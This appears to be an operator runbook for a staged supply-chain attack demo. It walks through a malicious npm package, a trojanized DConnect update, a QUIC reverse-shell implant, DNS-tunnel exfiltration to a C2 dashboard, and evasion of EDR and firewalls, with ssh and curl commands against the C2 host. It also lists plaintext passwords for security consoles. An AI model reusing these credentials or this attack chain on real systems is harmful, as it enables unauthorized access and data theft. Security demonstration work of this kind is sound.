# ACME Corp — demo provisioning runbook (admin)

Two-victim show: **arjun.das** (software developer, Linux, no admin) and
**jonathan.lim** (CTO/CIO, Windows desktop, DConnect delivery). End users never
provision anything — arjun only runs `npmi` + `npm run build`, jonathan only
opens DConnect.

---

## A. jonathan.lim's Windows desktop (prep BEFORE his snapshot)

> **One-shot (recommended):** from an elevated PowerShell with
> `provision-user.ps1` + `seed-acme.cmd` + `seed-acme.sh` in the same folder,
> run `.\provision-user.ps1` — it does A1 + A2 + A3 in one pass (creates the
> least-privilege `jonathan.lim` account, winget toolchain, DConnect clone +
> install, desktop shortcut, CTO seeds, QUIC venv pre-warm) and prints a
> verification checklist. The manual steps below remain as reference.

### A1. Install the toolchain (once)

| Tool | Why | Get it |
| --- | --- | --- |
| Node.js ≥ 16 LTS | DConnect build (`npm install`) + Electron runtime | nodejs.org LTS, check *Add to PATH* |
| Python 3.11+ | payload tunnel client + QUIC implant (python.exe on PATH) | python.org, **check *Add python.exe to PATH*** |
| Git for Windows | clone DConnect **and** npm's `git+https` dependency fetches | git-scm.com (default options) |

Verify in PowerShell: `node -v`, `python --version`, `git --version`.

### A2. Install DConnect (no Join yet!)

```powershell
cd $env:USERPROFILE
git clone https://github.com/46y9qkpkjc-ui/dconnect.git DConnect
cd DConnect
npm install                       # downloads Electron once (~1-2 min)
npm start                         # smoke-test launch, then CLOSE the app
```

Desktop shortcut for jonathan.lim: target
`C:\Users\jonathan.lim\DConnect\node_modules\electron\dist\electron.exe`,
arguments `.`, start in `C:\Users\jonathan.lim\DConnect`.

> **Do not click “Join” during prep.** The 2.4.0 update must stream on camera.
> App must sit at v2.3.4 until recording.

### A3. Seed CTO assets + optional niceties

From Git Bash:

```bash
cd /c/Users/jonathan.lim/DConnect/..        # any dir with seed-acme.cmd
./seed-acme.cmd cto                          # OT/IoT + source/model files
```

- Optional pre-warm (so the C2 session appears seconds after the update, not
  a minute): `python -m venv %TEMP%\quicvenv && %TEMP%\quicvenv\Scripts\pip install aioquic`
- `corp-ca.pem` is **not** required on this host (payload falls back to
  insecure TLS for the dashboard POST; npm/GitHub use public CAs).
- Hosts-file entries (`hosts.sample`) only matter if you showcase
  `traceroute`/`scan` on jonathan — not needed for the short cut.

### A4. Snapshot

Snapshot **after A1–A3**, before any Join. Restore replays the whole act clean.

---

## B. arjun.das's Linux box (after EVERY snapshot restore, before recording)

1. **Seeds** (all four classes — this is the dashboard wow):

   ```bash
   ./seed-acme.sh all
   ```

2. **Dev project + CI/CD pipeline** (the innocent cover activity):

   ```bash
   ./demo-build.sh      # ~/work/ml-serving + local origin with CI hook
   ```

3. **Hygiene**:

   ```bash
   rm -f /tmp/logfwd.lock        # expired anyway, but keeps npmi deterministic
   command -v npmi               # must resolve (/usr/local/bin/npmi)
   ```

4. **Recording order**:

   ```bash
   cd ~/work/ml-serving
   npmi install ai-model-observability   # the malicious package download
   npm run build                          # typecheck + bundle + git push -> CI/CD
   ```

   `npm run build` ends with the real `git push` whose hook prints
   `remote: [ci] stage … BUILD SUCCESS — pipeline #4721`. Then cut to the
   dashboard — the record from his box is already there (recon, env, file
   harvest, asset register with core IP / MNPI / regulated / OT-IoT).

---

## C. Shared pre-roll (dns1, once per recording session)

```bash
ssh -i ~/.ssh/dns1-mig.pem ubuntu@52.74.96.66 \
  ': > ~/dnsproxy/ingest_records.jsonl; sudo systemctl restart dnsproxy-ingest'   # fresh canvas
ssh -i ~/.ssh/dns1-mig.pem ubuntu@52.74.96.66 \
  'sudo systemctl restart quic-c2'                    # fresh console: [C2] Implant connected!
```

The payload's egress channel is the DNS-record proxy (`dnsproxy_client.py serve`
on `127.0.0.1:8889` → `dnsproxy_ingest.py` on dns1) for downloads, plus the QUIC
reverse shell for follow-on chains. There is no second C2 channel and no
HTTP forward proxy — do not start one.

Dashboard: `https://52.74.96.66:8443/` (auto-refresh) · `/victims`
(also auto-refreshes every 15s — the register fills in visibly during a dwell).

---

## D. Recording (3 scenes — cut order **1 → 2 → 3**)

Voice-over is generated afterwards (edge-tts) and merged — nobody narrates
live, so nothing on screen needs to be paused or driven by hand.

### Scene 1 — arjun.das (Linux dev, VS Code)

Project Visual Studio Code with **text size 28** on the inbuilt shell prompt:

1. `whoami` → `arjun.das`
2. `traceroute 1.1.1.1`
3. navigate to the repo page, read the README
4. back to the VS console → `npmi install ai-model-observability`
   → install output streams the 6 phases
5. code some import statements
6. `npm run build` → build log + CI/CD pipeline green
   (`remote: [ci] stage … BUILD SUCCESS — pipeline #4721`)

Box is **pre-provisioned** (seeds · demo-build · npmi · `/etc/hosts` all
baked in) — quick check: `command -v npmi` and
`ls ~/AcmeDocs ~/work/ml-serving`. **Do NOT re-restore the old snapshot**
(it predates these fixes); snapshot the prepared state once so a failed take
can be rolled back.

arjun's record lands on the dashboard within ~10s of the install finishing.

### Scene 2 — jonathan.lim (Windows CTO)

1. log in as `jonathan.lim`
2. cmd prompt → `traceroute 1.1.1.1`
3. connect to the conference call on DConnect → click **Join**
   → sleek 2.4.0 update streams → **join screen with the Google/Mashable GIF**
   → **CUT HERE**

Keep DConnect open for the rest of the shoot — closing it kills his channels
(watchdog) and ends his shell session.

### Scene 3 — the reveal

1. **`https://52.74.96.66:8443/`** — the network animation, dwell
   **≥45s**. It is **self-running**: no tabs, no play/pause/step/reset. It
   auto-starts on load, runs baseline → pivot → exfil, and **holds on the
   exfil money shot**. Reload the page (F5) to restart a take.
2. **`/victims`** — asset register: both victim cards, the exfiltrated data,
   then **REVERSE SHELL** (`whoami`, `dir`, `help`) — the session appears once
   the QUIC implant registers (a few seconds; instant if the venv was pre-warmed)
3. **All-clear showcase** (read-only console viewing):

   | Console | URL | Login |
   | --- | --- | --- |
   | CrowdStrike Falcon | `https://falcon.us-2.crowdstrike.com/activity-v2/detections` | `arunkumar.subbiah@apexaegis.app` / `@lertsh0T@runs` |
   | FortiGate | `https://34.124.132.44` | `admin` / `@lertsh0T@runs` |
   | Palo Alto | `https://35.187.232.12` | `admin` / `@lertsh0T@runs` |

   Point at each: **no threat / no anomaly detected** — the punchline is that
   all three stayed clean while the data left.

### Falcon note

The sensor is live on both endpoints. `stage.js` still detects it and records
the result on the victim row, but it no longer suppresses the DNS tunnel — the
DNS-record proxy starts regardless and carries downloads and exfil. Confirm the
`/victims` EDR row still reads `0 DETECTIONS` (green) after this change: if
Falcon raises a detection for DNS tunneling, the green row is no longer
guaranteed. The `:8443` animation is illustrative narration of the backend, not
a packet-for-packet replay.

---

## E. Rehearsal vs. shoot (canvas hygiene)

A rehearsal `npmi install` writes a **real record** — so:

```bash
# clear after every rehearsal, before the real take
ssh -i ~/.ssh/dns1-mig.pem ubuntu@52.74.96.66 \
  ': > ~/dnsproxy/ingest_records.jsonl; sudo systemctl restart dnsproxy-ingest; \
   sleep 3; echo "records: $(curl -sk https://127.0.0.1:8443/api/records)"'
```

Verify empty before rolling camera:

```bash
curl -sk https://52.74.96.66:8443/api/records          # expect []
curl -sk https://52.74.96.66:8443/api/victims          # expect []
```

> The canvas is cleared by truncating the file **and restarting**
> `dnsproxy-ingest`: records are loaded into memory only at startup, so
> truncating alone leaves the old process serving stale records — the canvas
> *looks* empty but isn't. `systemctl restart` replaces the old hand-rolled
> `pkill`/`nohup` dance. Always confirm via the API, not via `stat`.
